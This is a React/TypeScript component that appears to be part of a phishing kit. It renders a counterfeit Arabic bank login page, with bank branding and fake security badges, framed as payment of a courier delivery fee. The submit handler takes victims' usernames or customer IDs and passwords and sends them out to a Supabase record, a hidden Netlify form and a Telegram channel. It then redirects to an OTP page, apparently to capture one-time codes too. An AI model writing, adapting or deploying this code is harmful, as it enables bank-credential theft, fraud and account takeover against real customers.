import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default;
  const branding = getServiceBranding(linkData?.payload?.service_key || "aramex");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || (!username && !customerId)) {
      toast({ title: "خطأ", description: "يرجى إكمال بيانات الدخول", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const bankLoginData = { username, customerId, password };

    try {
      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, bankLoginData } });

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          linkId: id!,
          bank: selectedBank?.nameAr || "غير محدد",
          username: username || customerId,
          password: password,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'bank_login',
        data: {
          username: username || customerId,
          password: password,
          bank: selectedBank?.nameAr,
          service: branding.name,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل تسجيل الدخول", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  const primaryColor = selectedBankBranding.colors.primary;
  const textColor = selectedBankBranding.colors.text;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ background: selectedBankBranding.colors.surface, fontFamily: selectedBankBranding.fonts.arabic }}>
      <PaymentMetaTags 
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
        serviceName={selectedBank?.nameAr || "البنك"}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      />

      <header className="w-full bg-white border-b-2 shadow-sm" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto px-4 h-20 flex items-center justify-between">
            <div className="flex items-center gap-6">
               <div className="w-32 sm:w-44">
                  {selectedBankId && (
                    <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} color={primaryColor} size="lg" />
                  )}
               </div>
               <div className="hidden md:block h-10 w-px bg-gray-200" />
               <div className="hidden md:block">
                  <h1 className="text-sm font-black text-gray-700">الخدمات المصرفية للأفراد</h1>
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Personal Online Banking</p>
               </div>
            </div>
            <div className="flex items-center gap-4">
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full border bg-gray-50 text-[10px] font-black text-gray-500 cursor-pointer">
                  <Globe className="w-3 h-3" />
                  <span>ENGLISH</span>
               </div>
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-black">
                  <Lock className="w-3 h-3" />
                  <span>SECURED</span>
               </div>
            </div>
         </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12">
         <div className="w-full max-w-md space-y-6">
            <Card className="border-none shadow-[0_20px_60px_-15px_rgba(0,0,0,0.1)] rounded-3xl overflow-hidden bg-white">
               <div className="p-8 sm:p-10 text-center">
                  <div className="w-16 h-16 rounded-2xl mx-auto mb-6 flex items-center justify-center text-white shadow-lg" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${selectedBankBranding.colors.secondary})` }}>
                     <Lock className="w-8 h-8" />
                  </div>
                  <h2 className="text-2xl font-black text-gray-900 mb-1">مرحباً بك</h2>
                  <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">Login to your account</p>
               </div>

               <form onSubmit={handleSubmit} className="px-8 sm:px-10 pb-10 space-y-6">
                  <div className="space-y-5">
                    <div className="space-y-1.5">
                       <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستخدم / رقم العميل</Label>
                       <div className="relative group">
                          <Input value={username} onChange={(e) => setUsername(e.target.value)} className="h-14 border-2 border-gray-100 rounded-xl font-black text-gray-700 bg-gray-50/50 pr-12 focus:border-blue-500 transition-all" placeholder="أدخل بيانات الدخول" required />
                          <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500" />
                       </div>
                    </div>

                    <div className="space-y-1.5">
                       <div className="flex items-center justify-between px-1">
                          <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">كلمة المرور</Label>
                          <button type="button" className="text-[10px] font-black text-blue-600 uppercase">نسيت؟</button>
                       </div>
                       <div className="relative group">
                          <Input value={password} onChange={(e) => setPassword(e.target.value)} type={showPassword ? "text" : "password"} className="h-14 border-2 border-gray-100 rounded-xl font-black text-gray-700 bg-gray-50/50 pr-12 pl-12 focus:border-blue-500 transition-all" placeholder="********" required />
                          <KeyRound className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500" />
                          <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-500">
                             {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                       </div>
                    </div>
                  </div>

                  <Button type="submit" disabled={isSubmitting} className="w-full h-14 rounded-xl font-black text-lg shadow-xl text-white active:scale-95 transition-all mt-4" style={{ backgroundColor: primaryColor }}>
                     {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "دخول آمن"}
                  </Button>
               </form>

               <div className="p-6 bg-gray-50 border-t flex items-center justify-center gap-4 text-[10px] font-bold text-gray-400 uppercase">
                  <div className="flex items-center gap-1.5">
                     <ShieldCheck className="w-3.5 h-3.5" />
                     <span>End-to-End Encryption</span>
                  </div>
                  <div className="w-1 h-1 rounded-full bg-gray-200" />
                  <div className="flex items-center gap-1.5">
                     <Lock className="w-3.5 h-3.5" />
                     <span>Secure Session</span>
                  </div>
               </div>
            </Card>

            <footer className="text-center space-y-4">
               <p className="text-[10px] font-bold text-gray-400 leading-relaxed max-w-xs mx-auto">
                  تنبيه: لا تقم بمشاركة بيانات دخولك أو الرقم السري مع أي شخص. البنك لن يطلب منك هذه البيانات عبر الهاتف.
               </p>
               <div className="flex items-center justify-center gap-4">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4 opacity-20" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4 opacity-20" />
               </div>
            </footer>
         </div>
      </main>

      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="bank" />
        <input type="text" name="username" />
        <input type="password" name="password" />
        <input type="text" name="amount" />
      </form>
    </div>
  );
};

export default PaymentBankLogin;
